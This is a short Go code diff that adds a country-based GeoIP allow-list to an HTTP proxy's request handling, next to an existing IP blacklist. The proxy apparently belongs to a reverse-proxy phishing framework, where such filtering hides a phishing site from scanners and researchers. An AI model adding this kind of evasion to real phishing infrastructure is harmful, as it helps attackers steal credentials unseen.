@@ -61,6 +61,7 @@ type HttpProxy struct {
 	cfg               *Config
 	db                *database.Database
 	bl                *Blacklist
+	geoiplist         *GeoIPList
 	sniListener       net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
@@ -81,7 +82,7 @@ type ProxySession struct {
 	Index       int
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, geoiplist *GeoIPList, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -89,6 +90,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		cfg:               cfg,
 		db:                db,
 		bl:                bl,
+		geoiplist:         geoiplist,
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
@@ -147,6 +149,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if p.bl.IsBlacklisted(from_ip) {
 				log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
 				return p.blockRequest(req)
+			}
+			allowed, country := p.geoiplist.IsAllowed(from_ip)
+			if !allowed {
+				log.Warning("geoiplist: request from ip address '%s' (%s) was blocked", from_ip, country)
+				return p.blockRequest(req)
+			} else {
+				log.Debug("geoiplist: request from ip address '%s' (%s) was allowed", from_ip, country)
 			}
 			if p.cfg.GetBlacklistMode() == "all" {
 				err := p.bl.AddIP(from_ip)
